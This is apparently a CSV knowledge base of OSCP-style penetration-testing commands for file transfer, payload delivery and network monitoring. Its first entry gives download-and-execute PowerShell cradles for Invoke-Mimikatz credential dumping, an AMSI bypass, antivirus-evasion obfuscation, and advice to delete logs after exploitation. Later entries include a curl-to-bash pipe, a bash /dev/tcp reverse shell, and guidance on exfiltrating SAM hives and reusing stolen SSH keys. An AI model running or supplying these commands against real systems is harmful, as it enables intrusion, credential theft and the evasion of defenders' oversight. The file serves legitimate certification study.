"ft-powershell-execute-memory","Execute PowerShell Script from Memory","file-transfer","IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>.ps1')","Download and execute PowerShell script directly in memory without touching disk. Bypasses file-based AV detection and leaves minimal forensic artifacts. OPSEC-friendly payload delivery.","in-memory-execution","IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')","STEALTHIEST PowerShell payload delivery. No disk writes = no file-based AV scan, no disk forensics. OSCP USE CASES: Invoke-Mimikatz, PowerUp, Invoke-Kerberoast, custom enumeration scripts. OPSEC ADVANTAGES: (1) No file I/O events, (2) No AV file scan trigger, (3) No forensic artifacts on disk, (4) Faster than download + execute. DISADVANTAGES: (1) PowerShell module/transcription logging still captures (if enabled), (2) Network traffic visible (HTTP GET logged), (3) Script stays in PowerShell process memory (detectable by memory scanners). Time estimate: 1-5 seconds (depends on script size and network speed).

MANUAL ALTERNATIVES:

Basic in-memory execution:
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')

With ExecutionPolicy bypass:
powershell -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')""

With proxy credentials:
$wc = New-Object Net.WebClient
$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
IEX $wc.DownloadString('http://<LHOST>/script.ps1')

HTTPS (encrypted traffic):
IEX (New-Object Net.WebClient).DownloadString('https://<LHOST>/script.ps1')
# Requires Kali HTTPS server: python3 -m http.server 443 --ssl

SMB-based (no HTTP server needed):
IEX (Get-Content \\<LHOST>\share\script.ps1 -Raw)
# Kali SMB server: smbserver.py share /opt/scripts/ -smb2support

Execute with parameters:
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'); Invoke-Mimikatz -DumpCreds

Encoded/obfuscated (bypass AV signatures):
$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://<LHOST>/encoded.txt')))
IEX $s

One-liner with shorter alias:
iex (iwr -Uri http://<LHOST>/script.ps1 -UseBasicParsing).Content
# iex = IEX, iwr = Invoke-WebRequest

Multiple scripts chained:
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerUp.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')
Invoke-AllChecks; Invoke-Mimikatz -DumpCreds

Download once, execute multiple times:
$script = (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')
IEX $script # First execution
IEX $script # Second execution (no re-download)

KALI HTTP SERVER SETUP:

Python HTTP server (simple):
cd /opt/powershell-scripts/
python3 -m http.server 80
# Access: http://<LHOST>/Invoke-Mimikatz.ps1

Apache (persistent):
sudo cp Invoke-Mimikatz.ps1 /var/www/html/
sudo systemctl start apache2
# Access: http://<LHOST>/Invoke-Mimikatz.ps1

HTTPS server (encrypted):
# Generate self-signed cert
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
python3 -m http.server 443 --ssl
# PowerShell ignores cert errors by default for DownloadString

COMMON POWERSHELL SCRIPTS FOR IN-MEMORY EXECUTION:

1. Invoke-Mimikatz (credential dumping):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

2. PowerUp (privilege escalation enumeration):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
Invoke-AllChecks

3. Invoke-Kerberoast (Kerberoasting):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | fl

4. Invoke-BloodHound (AD enumeration):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All

5. PowerView (AD reconnaissance):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1')
Get-NetUser; Get-NetGroup

DETECTION EVASION:

Obfuscate URL:
$url = 'http://' + '10.10.14.5' + '/script.ps1'
IEX (New-Object Net.WebClient).DownloadString($url)

Obfuscate WebClient:
$wc = [Activator]::CreateInstance([Type]::GetTypeFromProgID('MSXML2.ServerXMLHTTP'))
$wc.open('GET', 'http://<LHOST>/script.ps1', $false)
$wc.send()
IEX $wc.responseText

Bypass AMSI (Antimalware Scan Interface):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')

OPSEC CONSIDERATIONS:
- Event ID 4688 (process creation) logs powershell.exe
- Event ID 3 (network connection) logs HTTP GET to Kali
- PowerShell module logging captures IEX command (if enabled)
- PowerShell transcription logs script content (if enabled)
- AMSI may scan downloaded string before execution
- Defenders monitor for: IEX, Net.WebClient, DownloadString in command line

MITIGATIONS:
- Use encoded Base64 commands to hide IEX from process arguments
- Use HTTPS to encrypt network traffic
- Obfuscate script content to evade AMSI
- Delete PowerShell logs post-exploitation (if possible)
- Use alternate protocols (SMB, DNS tunneling)

TIME ESTIMATE:
Script download: 1-5 seconds (depends on size and connection)
Script execution: Variable (depends on script)
Total: 2-10 seconds for typical scripts","high","","","","{""Execution Policy blocks script"": ""PowerShell Execution Policy restricting IEX. Solution: Bypass policy: powershell -ExecutionPolicy Bypass -Command \""IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>.ps1')\"". Or set policy: Set-ExecutionPolicy Bypass -Scope Process -Force (temporary, current session only)."", ""Unable to connect to remote server"": ""Target cannot reach Kali HTTP server. Solution: Verify web server running: ss -ntlp | grep :80 (on Kali). Test connectivity: curl http://<LHOST> (from target). Check firewall: sudo ufw allow 80/tcp (Kali). Verify correct LHOST IP: ip addr show tun0. Try alternate port: python3 -m http.server 8080 (change URL to :8080)."", ""Proxy Authentication Required (407)"": ""Corporate proxy blocking outbound HTTP. Solution: Bypass proxy: (New-Object Net.WebClient).Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>.ps1'). Or use SMB instead of HTTP: IEX (Get-Content \\\\<LHOST>\\share\\script.ps1 -Raw)."", ""Script downloads but doesn't execute"": ""Syntax error or script expecting parameters. Solution: Test script locally first: IEX (Get-Content C:\\script.ps1 -Raw). Check for required parameters: Get-Help Invoke-Script. Pass parameters: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'); Invoke-Function -Param value."", ""AV blocks download"": ""AV signatures in HTTP traffic or script content. Solution: (1) Obfuscate script: Invoke-Obfuscation, (2) Use HTTPS: python3 -m http.server --ssl, (3) Encode script: $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'))); IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))). (4) Use alternate delivery: SMB, DNS tunneling, etc."", ""IEX not recognized (PowerShell 1.0)"": ""Ancient PowerShell version. Solution: Use full cmdlet name: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'). Or upgrade PowerShell (if possible).""}","{""IEX"": ""Invoke-Expression cmdlet - executes string as PowerShell code. Alias for Invoke-Expression. CRITICAL: Downloaded script runs directly in memory, never written to disk. OPSEC ADVANTAGE: No file I/O events (Event ID 4663), no AV file scan, no forensic disk artifacts. DISADVANTAGE: Logged in PowerShell transcription/module logging if enabled."", ""New-Object Net.WebClient"": ""Creates .NET WebClient object for HTTP operations. ALTERNATIVE: Invoke-WebRequest (IWR) is newer but more logged. WebClient is stealthier - generates less ETW telemetry. Works on PowerShell 2.0+ (including old Windows 7/2008)."", "".DownloadString()"": ""Downloads file as string (text). Returns content directly to memory. CRITICAL: Use DownloadString for scripts (.ps1), NOT DownloadFile (which writes to disk). DownloadString keeps payload in RAM only."", ""http://<LHOST>/<SCRIPT>.ps1"": ""URL of PowerShell script on attacker's web server. OSCP SETUP: Start HTTP server on Kali: python3 -m http.server 80. Place script in web root: /var/www/html/ or current directory. URL example: http://10.10.14.5/Invoke-Mimikatz.ps1""}","[""ft-python-http-server""]","[""ft-certutil-download"", ""ft-powershell-iwr""]","[""nc-listener-setup"", ""mimikatz-sekurlsa-logonpasswords""]"
"ft-base64-encode","Base64: Encode for Transfer","file-transfer","base64 -w0 <FILE>","Encode file as base64 for copy/paste transfer or text-only channels","encoding","base64 -w0 binary.exe","OSCP METHODOLOGY: Use when only text-based exfiltration available (web shells, SQL injection, command injection with output only). Encodes binary files as printable text. Size increases ~33%.

MANUAL ALTERNATIVE: Could use hex encoding (xxd), but base64 is more compact (hex is 2x size increase vs 1.33x).

USE CASES: 
- Copy/paste small files via RDP/VNC clipboard
- Exfiltrate via SQL injection (SELECT base64_data)
- Transfer via web shell echo output
- Bypass file type restrictions

EXAM TIP: Only practical for files <1MB due to terminal buffer limits and manual copy/paste. For larger files, use ft-nc-send or ft-curl-upload. After encoding, copy entire output (triple-click in terminal), paste to Kali, decode.

DECODE ON KALI: echo '<BASE64_STRING>' | base64 -d > decoded_file
DECODE ON WINDOWS: certutil -decode encoded.txt decoded.exe
DECODE IN POWERSHELL: [System.Convert]::FromBase64String('<STRING>') | Set-Content -Encoding Byte decoded.exe

TIME ESTIMATE: Encoding instant for files <10MB. Manual copy/paste adds 30-60 seconds.","medium","","","","{""base64 not found"": ""Should be in coreutils on all Linux. Check: which base64. Alternative: openssl base64 -A < file"", ""Terminal buffer overflow"": ""For large files, save to file: base64 -w0 file > encoded.txt, then transfer encoded.txt"", ""Copy/paste corrupts encoding"": ""Verify no line breaks inserted: wc -l encoded.txt should be 1. Use proper terminal selection"", ""Decode produces wrong file size"": ""Encoding corrupted during transfer. Re-encode and verify: md5sum original; encode; transfer; decode; md5sum decoded""}","{""-w0"": ""Wrap width 0 - disable line wrapping, output single line (required for easy copy/paste). Default wraps at 76 chars"", ""-d"": ""Decode mode - decode base64 back to binary: base64 -d encoded.txt > binary.exe"", ""-i <INPUT>"": ""Input file - alternative to redirection: base64 -w0 -i file.exe"", ""Without -w0"": ""Output wrapped at 76 chars - harder to copy/paste, need to remove newlines""}","","[""ft-nc-send"", ""ft-curl-upload""]","[""ft-base64-encode""]"
"ft-scp-upload","SCP: Secure Upload","file-transfer","scp <FILE> <USERNAME>@<TARGET>:/tmp/","Upload file via SSH/SCP (requires credentials)","ssh-transfer","scp exploit.sh user@192.168.45.100:/tmp/","OSCP METHODOLOGY: Use when you have SSH credentials (password or key). Less common in OSCP than HTTP transfers, but useful when SSH is the primary access vector. Encrypted transfer, cleaner than setting up HTTP servers.

MANUAL ALTERNATIVE: Could use SFTP interactively, but SCP is faster for scripting single file transfers.

WHEN TO USE: 
- You have SSH credentials
- Target allows SSH (port 22/custom port open)
- Need encrypted transfer
- Transferring to/from pivot boxes where you have SSH

EXAM TIP: If you compromised SSH keys (/home/user/.ssh/id_rsa), use them: scp -i stolen_id_rsa file user@target:/tmp/. Remember -P (capital P) for non-standard ports.

VS HTTP: SCP is encrypted and authenticated, but requires SSH access. HTTP is unauthenticated and works over more restricted firewalls.

BIDIRECTIONAL: Use ft-scp-download for reverse transfer (target to Kali)

TIME ESTIMATE: Fast, limited by network speed. 1-10MB/sec typical.","medium","","","","{""Host key verification failed"": ""Accept new key: ssh-keyscan <TARGET> >> ~/.ssh/known_hosts OR use -o StrictHostKeyChecking=no (insecure)"", ""Permission denied with password"": ""SSH may require key auth only. Generate key: ssh-keygen, copy: ssh-copy-id user@target"", ""Non-standard SSH port"": ""Use -P (capital): scp -P 2222 file user@host:/tmp/"", ""Destination permission denied"": ""Try writable directory: /tmp/, /dev/shm/, /var/tmp/, or user home: scp file user@host:~/"", ""Connection times out"": ""Check SSH running: nc -zv <TARGET> 22, verify firewall allows port 22""}","{""-P <PORT>"": ""SSH port - use capital P for scp (lowercase -p is preserve timestamps): scp -P 2222 file user@host:/tmp/"", ""-i <KEY>"": ""SSH private key - use instead of password: scp -i id_rsa file user@host:/tmp/"", ""-r"": ""Recursive - upload entire directory: scp -r /local/dir user@host:/tmp/"", ""-C"": ""Compression - enable gzip compression for faster transfer over slow links: scp -C file user@host:/tmp/""}","","[""ft-wget-download"", ""ft-curl-upload""]","[""ft-scp-download""]"
"ft-scp-download","SCP: Secure Download","file-transfer","scp <USERNAME>@<TARGET>:<REMOTE_FILE> <LOCAL_PATH>","Download file from target via SSH/SCP (exfiltration with credentials)","ssh-transfer","scp user@192.168.45.100:/home/user/proof.txt ./proof.txt","OSCP METHODOLOGY: Use for exfiltration when you have SSH credentials. Cleaner than setting up upload servers. Encrypted transfer. Less common in OSCP than HTTP uploads, but valuable when SSH is access method.

MANUAL ALTERNATIVE: Could SSH in and cat file, redirect output, but SCP preserves binary files perfectly.

WILDCARDS: Download multiple files: scp user@host:'/var/log/*.log' ./logs/ (quotes required around remote path with wildcards)

EXAM TIP: If you compromised SSH keys, use them: scp -i stolen_key user@target:/root/proof.txt ./. For files you cannot read (permission denied), try to escalate privileges first or use sudo over SSH.

DIRECTORY DOWNLOAD: Download entire directories: scp -r user@target:/opt/sensitive_data ./loot/

VS HTTP UPLOAD: SCP is bidirectional (same tool for upload/download), encrypted, but requires SSH access. HTTP upload works through more restrictive firewalls.

TIME ESTIMATE: Fast, limited by network speed. 1-10MB/sec typical. Near-instant for proof.txt.","medium","","","","{""No such file or directory"": ""Verify file exists on target first: ssh user@target ls -la /path/to/file"", ""Permission denied reading file"": ""File may be root-owned. If you have sudo: ssh user@target sudo cat /file > local_file OR gain root SSH first"", ""Host key verification failed"": ""Add to known_hosts: ssh-keyscan <TARGET> >> ~/.ssh/known_hosts"", ""Cannot write to local path"": ""Check local directory writable: ls -la ., try different destination"", ""Wildcards not working"": ""Enclose remote path in quotes: scp user@host:'/path/*.txt' ./""}","{""-P <PORT>"": ""SSH port - use capital P: scp -P 2222 user@host:/file ./"", ""-i <KEY>"": ""SSH private key: scp -i id_rsa user@host:/file ./"", ""-r"": ""Recursive - download entire directory: scp -r user@host:/dir ./"", ""-C"": ""Compression - faster over slow links: scp -C user@host:/file ./"", ""Colon syntax"": ""user@host:/path separates host from path - colon required""}","","[""ft-curl-upload"", ""ft-nc-send""]",""
"ft-wget-download","Linux: wget Download","file-transfer","wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>","Download file using wget on Linux target (ubiquitous, reliable)","linux-download","wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh","OSCP METHODOLOGY: First choice for Linux downloads - installed on 99% of systems. Shows progress bar (helpful for large files), auto-retries on failure, supports resume.

MANUAL ALTERNATIVE: Could use browser if GUI access available, or manual HTTP GET via netcat, but wget is almost always available.

EXAM TIP: After download, check file integrity: md5sum <FILE> and compare with source. Make scripts executable: chmod +x <FILE>. If wget unavailable, immediately try curl.

COMMON DESTINATIONS: /tmp/ (world writable but cleared on reboot), /dev/shm/ (RAM disk, fast), /var/tmp/ (persistent), current directory if writable.

WGET VS CURL: wget is simpler for basic downloads, shows progress, handles recursive downloads better. curl has more features but complex syntax.

TIME ESTIMATE: Near-instant for scripts under 1MB, shows real-time progress for larger files.","high","","","","{""wget not found"": ""Use alternative: ft-curl-download or ft-bash-dev-tcp"", ""SSL certificate problem"": ""Add --no-check-certificate flag for HTTPS"", ""Connection timeout"": ""Check firewall allows outbound HTTP, verify with: nc -zv <LHOST> <PORT>"", ""Cannot write file"": ""Check permissions: ls -la /tmp, try different directory: /dev/shm/, /var/tmp/"", ""File incomplete"": ""Resume download: wget -c http://<URL> (continues from where it stopped)""}","{""-O"": ""Output filename - use capital O to specify destination. Lowercase -o saves log output"", ""-q"": ""Quiet mode - suppress wget progress output, useful in scripts or low-bandwidth shells"", ""--no-check-certificate"": ""Skip SSL certificate validation - use for HTTPS with self-signed certs"", ""-P <DIR>"": ""Download to directory - alternative to -O, saves file with original name in specified directory"", ""-r"": ""Recursive download - download entire directory structure (rarely needed in OSCP)"", ""-b"": ""Background download - continues in background, useful for large files or unstable shells""}","[""ft-python-http-server""]","[""ft-curl-download"", ""ft-bash-dev-tcp""]","[""chmod-executable""]"
"ft-curl-download","Linux: curl Download","file-transfer","curl http://<LHOST>:<PORT>/<FILE> -o <OUTPUT>","Download file using curl on Linux target (alternative to wget)","linux-download","curl http://10.10.14.5:8000/exploit.sh -o /tmp/exploit.sh","OSCP METHODOLOGY: Second choice for Linux downloads when wget unavailable. More verbose by default but powerful. Available on most modern Linux systems alongside wget.

MANUAL ALTERNATIVE: Could manually construct HTTP GET via netcat or telnet, but curl is almost always available.

CURL VS WGET: curl supports more protocols (HTTP, HTTPS, FTP, SCP, etc.) and has more advanced features, but syntax is more complex. Use curl if you need specific HTTP headers or authentication.

EXAM TIP: Remember lowercase -o for curl (uppercase -O uses remote filename). Add -s for silent mode in scripts. For piped execution: curl http://<IP>/script.sh | bash

IN-MEMORY EXECUTION: Download and execute without saving: curl http://<IP>/script.sh | bash (stealthier, no disk artifacts)

TIME ESTIMATE: Comparable to wget, instant for small files, shows progress for large downloads.","high","","","","{""curl not found"": ""Use alternative: ft-wget-download or ft-bash-dev-tcp"", ""SSL certificate error"": ""Add -k flag: curl -k https://..."", ""No output file created"": ""Check output path writable, try: /tmp/, /dev/shm/"", ""Connection timeout"": ""Verify connectivity: curl -I http://<LHOST>:<PORT> (HEAD request)"", ""Redirect not followed"": ""Add -L flag to follow 301/302 redirects""}","{""-o"": ""Output filename - lowercase o for curl (vs capital O for wget)"", ""-O"": ""Use remote filename - saves with same name as on server, useful when URL has clear filename"", ""-k"": ""Allow insecure SSL connections - skip certificate validation for HTTPS with self-signed certs"", ""-s"": ""Silent mode - suppress progress meter and errors, useful in scripts"", ""-L"": ""Follow redirects - essential if URL redirects (HTTP 301/302), curl doesn't follow by default"", ""-#"": ""Show progress bar - alternative to default progress meter, cleaner for scripts""}","[""ft-python-http-server""]","[""ft-wget-download"", ""ft-bash-dev-tcp""]","[""ft-curl-upload""]"
"ft-bash-dev-tcp","Linux: Bash /dev/tcp Download","file-transfer","cat < /dev/tcp/<LHOST>/<PORT> > <OUTPUT>","Download file using bash pseudo-device (no external tools needed)","linux-download","cat < /dev/tcp/10.10.14.5/4444 > /tmp/file","OSCP METHODOLOGY: Last resort for downloads when wget, curl, nc all unavailable or blocked. Uses bash built-in TCP capabilities - no external commands executed, harder to detect in process monitoring.

MANUAL ALTERNATIVE: Could use telnet or other network tools, but /dev/tcp is pure bash.

WHEN TO USE: Extremely restricted environments where all download tools removed/blocked. Relies only on bash and cat (core utilities).

EXAM TIP: On attack machine, use netcat to serve file: nc -lvnp <PORT> < file. On target, immediately run this command. Connection is one-shot - closes after transfer. Check file integrity with md5sum.

LIMITATIONS: No error handling, no resume capability, requires bash (not sh/dash). Some bash builds lack /dev/tcp support (compile-time option).

REVERSE SHELLS: Same technique for shells: bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

TIME ESTIMATE: Instant for small files, but no progress indication. File appears when complete.","medium","","","","{""/dev/tcp not available"": ""Bash compiled with --disable-net-redirections. Use alternative: ft-wget-download or ft-curl-download"", ""Connection refused"": ""Ensure netcat listener running: nc -lvnp <PORT> < file on attack machine"", ""File empty or incomplete"": ""Restart listener and transfer. Add sleep: (sleep 1; cat < /dev/tcp/<IP>/<PORT>) > file"", ""Permission denied"": ""Check output directory writable, try /tmp/ or /dev/shm/""}","{""/dev/tcp/<IP>/<PORT>"": ""Bash pseudo-device - creates TCP connection to IP:PORT. Built into bash, no external commands needed"", ""cat <"": ""Read from TCP connection - receives data from pseudo-device"", ""> <OUTPUT>"": ""Redirect to file - saves received data to specified file"", ""/dev/udp/<IP>/<PORT>"": ""Alternative for UDP connections - less common but available""}","[""ft-nc-send""]","[""ft-wget-download"", ""ft-curl-download""]","[""bash-reverse-shell""]"
"ft-python-http-server","Setup: Python HTTP Server","file-transfer","python3 -m http.server <PORT>","Start HTTP server on attack machine to serve files for download","server-setup","python3 -m http.server 8000","OSCP METHODOLOGY: This is your go-to file server for 95% of transfers. Run from directory containing your tools (cd ~/tools). Serves ALL files in current directory recursively - be careful not to expose sensitive data.

MANUAL ALTERNATIVE: You could manually configure Apache/Nginx, but that's overkill for OSCP. This one-liner is faster.

EXAM TIP: Start this immediately after getting VPN connection. Use a high port (8000-9000) to avoid permission issues. Keep the terminal visible to monitor download requests - confirms target connectivity.

TIME ESTIMATE: 5 seconds to start server, instant downloads for tools under 50MB.","high","","","","{""Port already in use"": ""Change port or find process: sudo lsof -i :<PORT> then kill it"", ""Permission denied on port 80/443"": ""Use sudo: sudo python3 -m http.server 80"", ""Target cannot connect"": ""Check firewall rules, verify IP with: ip a, test with: curl http://127.0.0.1:<PORT>"", ""Wrong Python version"": ""Ensure Python 3: python3 -m http.server (Python 2 uses SimpleHTTPServer)""}","{""-m"": ""Run library module as a script - executes the http.server module directly without needing a separate script file"", ""http.server"": ""Built-in Python module that provides a simple HTTP server - no installation required, available on Kali and most Linux systems"", ""<PORT>"": ""Listening port - common choices are 80 (requires sudo), 443 (requires sudo), 8000 (default), 8080, or any high port (1024-65535)""}","","[""php-http-server"", ""ruby-http-server""]","[""ft-wget-download"", ""ft-certutil-download"", ""ft-powershell-iwr""]"
"ft-smb-server","Setup: Impacket SMB Server","file-transfer","impacket-smbserver <SHARE_NAME> <DIRECTORY> -smb2support","Start SMB server for Windows file transfers (faster than HTTP for large files)","server-setup","impacket-smbserver share . -smb2support","OSCP METHODOLOGY: Use for Windows targets when HTTP is blocked or for faster transfers (10-50x faster for large files). Port 445 often allowed on internal networks even when egress HTTP is blocked.

MANUAL ALTERNATIVE: Configure Samba manually in /etc/samba/smb.conf, but Impacket is much faster for quick transfers.

EXAM TIP: If target is Windows 10+ and connection fails, immediately try with authentication flags. After initial setup, files can be executed directly from share without downloading: \\<KALI_IP>\share\nc.exe

REALITY CHECK: Some modern Windows builds require SMB signing which this doesn't support - fall back to HTTP if authentication still fails.

TIME ESTIMATE: 5 seconds to start server. File transfers 10-100MB/sec on local network (much faster than HTTP).","high","","","","{""STATUS_ACCESS_DENIED on newer Windows"": ""Add authentication: -username user -password pass, then on target: net use \\\\<IP>\\share /user:user pass"", ""Port 445 already in use"": ""Stop Samba: sudo systemctl stop smbd nmbd, or use different tool"", ""Target cannot connect"": ""Verify port 445 open on target firewall, check with: nc -zv <TARGET> 445"", ""Works but files not visible"": ""Check directory path is correct: ls -la <DIRECTORY>"", ""SMB1 negotiation failed"": ""Ensure -smb2support flag present""}","{""-smb2support"": ""Enable SMB2/SMB3 protocol support - REQUIRED for Windows 10/11 and Server 2016+ which disabled SMB1. Without this flag, modern Windows systems cannot connect"", ""-username <USER>"": ""Require authentication with this username - use when target requires credentials (newer Windows updates)"", ""-password <PASS>"": ""Set password for authenticated access - pair with -username when SMB signing required"", ""<SHARE_NAME>"": ""Arbitrary name you choose - targets access via \\\\<KALI_IP>\\<SHARE_NAME>. Common choices: share, tools, files"", ""<DIRECTORY>"": ""Absolute or relative path - serves this folder's contents. Use . to serve current directory""}","","[""ft-python-http-server""]","[""ft-smb-download"", ""ft-smb-upload""]"
"ft-uploadserver","Setup: Python Upload Server","file-transfer","python3 -m uploadserver <PORT>","Start HTTP server that accepts file uploads from targets (exfiltration)","server-setup","python3 -m uploadserver 80","OSCP METHODOLOGY: Essential for data exfiltration - getting loot OFF the target back to Kali. Accepts uploads at /upload endpoint via POST requests. Simpler than configuring PHP upload scripts.

MANUAL ALTERNATIVE: Write custom PHP/Python upload handler, but uploadserver is purpose-built and faster.

INSTALLATION: pip3 install uploadserver (may need to install once on exam Kali VM).

EXAM TIP: Start this when you need to exfiltrate proof.txt, database dumps, or any files from target. Files save to current directory by default - cd to organized folder first. Monitor terminal to see upload progress.

COMMON UPLOADS: proof.txt, local.txt, SAM/SYSTEM hives, password files, database dumps.

TIME ESTIMATE: 5 seconds to start server, upload speed depends on file size and network (typically 1-10MB/sec).","high","","","","{""Module not found"": ""Install: pip3 install uploadserver OR python3 -m pip install uploadserver"", ""Port 80 permission denied"": ""Run with sudo: sudo python3 -m uploadserver 80"", ""Upload times out"": ""Check target egress firewall allows outbound HTTP, try port 80/443"", ""Large file fails"": ""Uploadserver has no size limit, but check disk space: df -h""}","{""-m uploadserver"": ""Run uploadserver module - simple HTTP server with POST upload endpoint at /upload"", ""<PORT>"": ""Listening port - use 80/443 if target has egress filters, or 8000+ for convenience"", ""--directory <DIR>"": ""Save uploaded files to specific directory instead of current directory"", ""--basic-auth <USER>:<PASS>"": ""Require HTTP basic authentication for uploads""}","","[""ft-smb-server"", ""ft-nc-receive""]","[""ft-powershell-upload"", ""ft-curl-upload""]"
"lsof-network-all","List All Network Connections","monitoring","lsof -i -P -n","List all network connections with process names, PIDs, and ports (no DNS resolution)","network-monitoring","","CRITICAL for OSCP defense monitoring and privilege escalation.

Shows:
(1) What services are listening, (2) Which processes have active connections, (3) User running each service.

The -P and -n flags provide raw data without DNS/service lookups (faster and avoids network activity).

Time estimate:
2-5 seconds.

Manual alternative:
cat /proc/net/tcp; cat /proc/net/udp (manual parsing required).","high","","","","","{""-i"": ""Select internet addresses (all IPv4/IPv6 network files - TCP/UDP connections, listening sockets)"", ""-P"": ""Inhibit port-to-service name conversion (show numeric ports instead of 'http', 'ssh')"", ""-n"": ""Inhibit DNS resolution (show IP addresses instead of hostnames for faster output)""}","","[""netstat-listening-tcp"", ""ss-listening-all""]",""
"lsof-listening-ports","List Only Listening Ports","monitoring","lsof -i -P -n -sTCP:LISTEN","Show only processes listening for incoming connections (attack surface identification)","network-monitoring","","Filters to only show listening ports (attack surface).

OSCP tip:
Compare internal listening ports (127.0.0.1:*) vs external (0.0.0.0:* or specific IP).

Internal-only ports often have weaker authentication.

For UDP listeners:
lsof -i -P -n -sUDP:Idle.

Time estimate:
2 seconds.","high","","","","","{""-i"": ""Select internet addresses"", ""-P"": ""Show numeric ports"", ""-n"": ""Show numeric IPs (no DNS)"", ""-sTCP:LISTEN"": ""Select only TCP connections in LISTEN state (waiting for incoming connections)""}","","[""netstat-listening-tcp"", ""ss-listening-ports""]",""
"lsof-port-specific","Find Process Using Specific Port","monitoring","lsof -i :<PORT>","Identify which process is using a specific port (both TCP and UDP)","network-monitoring","lsof -i :80","Essential for troubleshooting 'port already in use' errors or identifying what service is bound to a discovered port.

For TCP only:
lsof -i TCP:<PORT>.

For UDP only:
lsof -i UDP:<PORT>.

Time estimate:
<1 second.","high","","","","","{""-i"": ""Select internet addresses"", "":<PORT>"": ""Filter by specific port number (checks both TCP and UDP)""}","","[""fuser-port-tcp""]",""
"fuser-port-tcp","Find Process Using Port (fuser)","monitoring","fuser -v <PORT>/tcp","Alternative method to identify process using a specific TCP port","network-monitoring","fuser -v 443/tcp","Lighter weight than lsof.

Good for quick port checks.

For UDP:
fuser -v <PORT>/udp.

Time estimate:
<1 second.","medium","","","","","{""-v"": ""Verbose - displays USER, PID, ACCESS, COMMAND columns"", ""/tcp"": ""Specify TCP protocol (use /udp for UDP)""}","","[""lsof-port-specific""]",""
"netstat-listening-tcp","Netstat Listening Ports with PIDs","monitoring","netstat -tulpn","Show all listening TCP/UDP ports with process names and PIDs (classic tool, older systems)","network-monitoring","","Classic tool but deprecated in favor of 'ss' on modern systems.

Still widely used in OSCP labs.

MUST run with sudo for PID information, otherwise shows '(No info)'.

OSCP tip:
Focus on:
(1) 0.0.0.0:* (externally accessible), (2) 127.0.0.1:* (local only, often weaker auth), (3) Unusual high ports (potential backdoors).

Time estimate:
2 seconds.","high","","","","","{""-t"": ""Show TCP connections"", ""-u"": ""Show UDP connections"", ""-l"": ""Show only listening sockets (waiting for connections)"", ""-p"": ""Show PID and program name for each socket"", ""-n"": ""Show numeric addresses (no DNS resolution)""}","[""ps-aux-full""]","[""ss-listening-all"", ""lsof-listening-ports""]","[""lsof-port-specific"", ""ps-aux-full"", ""systemctl-running-services""]"
"ss-listening-all","Socket Statistics (Listening Ports)","monitoring","ss -tulpn","Modern replacement for netstat - faster socket statistics with process mapping","network-monitoring","","Modern replacement for netstat - 10x faster on systems with many connections.

Same syntax as netstat for easy transition.

OSCP tip:
Use with grep for specific ports:
ss -tulpn | grep :80.

For all connections (not just listening):
ss -tupn.

Time estimate:
<1 second.","high","","","","","{""-t"": ""Display TCP sockets"", ""-u"": ""Display UDP sockets"", ""-l"": ""Display listening sockets only"", ""-p"": ""Show process using socket (requires root)"", ""-n"": ""Numeric - don't resolve service names or hostnames""}","[""ps-aux-full""]","[""netstat-listening-tcp"", ""lsof-listening-ports""]","[""lsof-port-specific"", ""ps-aux-full"", ""systemctl-running-services"", ""ss-established-connections""]"
"ss-established-connections","Show Established Connections","monitoring","ss -tupn state established","Display only active established connections with process information","network-monitoring","","Useful for detecting active attacks or data exfiltration.

OSCP defense tip:
Unexpected ESTABLISHED connections to external IPs may indicate compromise.

Time estimate:
<1 second.","medium","","","","","{""-t"": ""TCP sockets"", ""-u"": ""UDP sockets"", ""-p"": ""Show process"", ""-n"": ""Numeric output"", ""state established"": ""Filter to show only established connections (active data transfer)""}","","",""
"win-netstat-process-mapping","Windows Netstat with PIDs","monitoring","netstat -ano","Show all Windows network connections with PIDs for process mapping","network-monitoring","","Essential for Windows network monitoring.

Combine with tasklist to map PIDs to names:
netstat -ano | findstr LISTENING, then tasklist /fi ""PID eq <PID>"".

OSCP tip:
Look for (1) LISTENING on 0.0.0.0 (externally accessible), (2) ESTABLISHED to unexpected IPs (C2 traffic), (3) Unusual ports (backdoors).

Time estimate:
